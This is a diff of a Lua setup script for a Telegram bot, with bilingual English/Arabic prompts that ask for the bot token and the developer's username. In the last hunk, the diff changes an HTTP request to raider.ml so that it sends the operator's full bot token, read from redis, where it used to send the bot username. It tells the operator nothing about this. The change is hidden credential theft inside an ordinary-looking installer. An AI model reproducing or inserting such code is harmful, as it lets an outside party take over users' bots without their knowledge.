@@ -15,14 +15,11 @@ io.write('\n\27[1;35m⬇┇Send Token For Bot : ارسل توكن البوت ...
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-local RaideGetBot = https.request('https://api.telegram.org/bot'..token..'/getMe')
-local Get_UserBot = JSON.decode(RaideGetBot)
 if res ~= 200 then
 io.write('\n\27[1;31m🔄┇Token Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m☑┇Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
 redis:set(Server_DevRaider.."Token_DevRaider",token)
-redis:set(Server_DevRaider.."UserBot_DevRaider",Get_UserBot.result.username)
 end 
 else
 io.write('\n\27[1;31m🔄┇Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
@@ -34,7 +31,7 @@ if not redis:get(Server_DevRaider.."User_DevRaider1") then
 io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local RaiderInfo = http.request("http://raider.ml/GetUser?id="..User_Sudo)
+local RaiderInfo = http.request("http://raider.ml/GetUser?user="..User_Sudo)
 local Raider_Dev_info = JSON.decode(RaiderInfo)
 if Raider_Dev_info.information.status == "invalid" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
@@ -51,7 +48,7 @@ end
 io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_DevRaider.."User_DevRaider1",Raider_Dev_info.information.status.Username)
 redis:set(Server_DevRaider.."Id_DevRaider",Raider_Dev_info.information.status.Id)
-http.request("http://raider.ml/insert/?id="..Raider_Dev_info.information.status.Id.."&user="..Raider_Dev_info.information.status.Username.."&userbot="..redis:get(Server_DevRaider.."UserBot_DevRaider"))
+http.request("http://raider.ml/insert/?id="..Raider_Dev_info.information.status.Id.."&user="..Raider_Dev_info.information.status.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
